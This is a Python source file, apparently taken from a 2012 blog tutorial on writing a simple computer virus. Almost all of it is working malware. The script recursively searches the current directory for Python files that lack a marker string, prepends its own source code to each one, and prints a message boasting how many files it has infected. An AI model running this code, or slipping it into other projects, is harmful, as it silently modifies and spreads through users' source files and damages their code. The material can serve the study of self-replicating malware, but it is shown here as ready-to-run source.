## https://cranklin.wordpress.com/2012/05/10/how-to-make-a-simple-computer-virus-with-python/
import os

marker = "VIRUS"

def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for name in filelist:
        if os.path.isdir(path+"/"+name):
            filestoinfect.extend(search(path+"/"+name))
        elif name[-3:] == ".py":
            infected = False
            for line in open(path+"/"+name):
                if marker in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+name)
    return filestoinfect

def infect(filestoinfect):
    number_files_infected=0
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
       virusstring += line
    virus.close
    for name in filestoinfect:
        number_files_infected+=1
        f = open(name)
        temp = f.read()
        f.close()
        f = open(name,"w")
        f.write(virusstring + temp)
        f.close()
    return number_files_infected

filestoinfect = search(os.path.abspath(""))
number_files_infected=infect(filestoinfect)
print("THE MALWARE IS OUT!, "+str(number_files_infected)+" FILES HAVE BEEN INFECTED!")
a="This file is infected by malware"
print('Hello world!')